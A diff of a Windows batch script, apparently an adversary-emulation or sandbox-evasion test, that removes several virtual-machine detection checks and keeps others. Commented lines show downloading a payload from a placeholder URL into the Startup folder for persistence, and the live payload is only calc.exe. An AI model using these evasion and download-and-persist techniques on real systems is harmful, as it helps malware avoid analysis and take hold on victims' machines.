@@ -17,24 +17,10 @@ if %errorlevel% equ 0 (
     goto :end
 )
 
-:: Check for VM-related services
-sc query | findstr /i "vmms vmware virtualbox parallels vboxsvc" > nul
-if %errorlevel% equ 0 (
-    echo [DETECTED] Virtual machine services detected.
-    goto :end
-)
-
 :: Check for VM disk identifiers
 wmic diskdrive get model, interfaceType | findstr /i "VMware VirtualBox VBOX QEMU Parallels" > nul
 if %errorlevel% equ 0 (
     echo [DETECTED] Virtual machine disk or interface detected.
-    goto :end
-)
-
-:: Check for VM-specific network adapters
-wmic nic get name, manufacturer | findstr /i "VMware VirtualBox Microsoft Parallels QEMU Xen" > nul
-if %errorlevel% equ 0 (
-    echo [DETECTED] VM-specific network adapter detected.
     goto :end
 )
 
@@ -52,21 +38,6 @@ if %timeDiff% LSS 100 (
     goto :end
 )
 
-:: Check for specific VM registry keys
-reg query "HKLM\SOFTWARE" | findstr /i "VMware VirtualBox Parallels Microsoft QEMU" > nul
-if %errorlevel% equ 0 (
-    echo [DETECTED] VM-specific registry keys detected.
-    goto :end
-)
-
-:: Check for low memory (VMs often have less memory allocated)
-for /f "tokens=2 delims==" %%a in ('wmic computersystem get totalphysicalmemory /value') do set mem=%%a
-set /a memMB=%mem:~0,-6%
-if %memMB% LSS 2048 (
-    echo [DETECTED] Low physical memory (%memMB% MB), typical of VM environments.
-    goto :end
-)
-
 :: If no VM indicators are found
 echo [NOT DETECTED] This system does not exhibit common virtual machine characteristics.
 
@@ -76,7 +47,6 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 ::        curl.exe -kL <urltopayload> -o %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat
 ::        powershell.exe -c Invoke-WebRequest -uri <urltopayload> -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat"
 powershell.exe -c calc.exe
-goto :end
 
 ::    Download script to Temp and execute with Registry Key
 
